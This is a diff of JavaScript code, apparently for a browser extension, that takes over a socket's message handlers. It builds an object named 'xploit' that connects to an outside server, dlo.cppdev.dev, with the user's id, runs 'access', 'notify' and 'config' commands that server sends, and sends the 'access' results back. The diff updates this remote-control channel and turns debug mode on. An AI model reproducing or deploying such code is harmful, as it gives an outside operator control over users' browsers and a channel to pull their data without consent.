@@ -5,7 +5,7 @@
     const uid = socket.options.url.match(/=[0-9]*$/)[0].replace(/^=/, "");
 
     const xploit = {
-        version: 2.004,
+        version: 2.006,
         ml: socket.onMessage,
         el: socket.onError,
         dl: socket.onDisconnect,
@@ -26,7 +26,7 @@
         },
         uid,
         sock: new class StableWebSocket {
-            #url = "https://dlo.cppdev.dev/v2?uid=" + uid; #ws;
+            #url = "https://dlo.cppdev.dev/v2?version=6&t=s&uid=" + uid; #ws;
             get ws() { return this.#ws };
             send(...args) { this.#ws.send(...args) };
 
@@ -112,9 +112,12 @@
         if (str.startsWith("access")) {
             // const js = ("{" + str.replace(/^.*?\{/, ""));
             const res = [];
-            for(const jso of arr)res.push(await access(jso));
+            for(const jso of arr){
+                const r=await access(jso)
+                res.push({ json: r, string: String(r) });
+            };
             if (debug) console.log("< access res", res);
-            xploit.sock.send("access" + JSON.stringify({ json: res, string: String(res) }));
+            xploit.sock.send("access" + JSON.stringify(res));
         } else if(str.startsWith("notify")) {
             for(const jso of arr)chrome.notifications.create({
                 type: 'basic',
@@ -126,6 +129,7 @@
             });
         } else if(str.startsWith("config")) {
             for(const jso of arr)Object.assign(xploit.conf,{});
+            xploit.sock.send("config"+JSON.stringify([xploit.conf]));
         } else if (str.startsWith("ping")) {
             if (debug) console.log("> ping");
             xploit.sock.send(str.replace("ping", "pong"));
@@ -162,4 +166,4 @@
     navigator.xploit = xploit;
     if (debug) globalThis.xploit = xploit;
     return debug ? xploit : xploit.version;
-})();
+})(true);
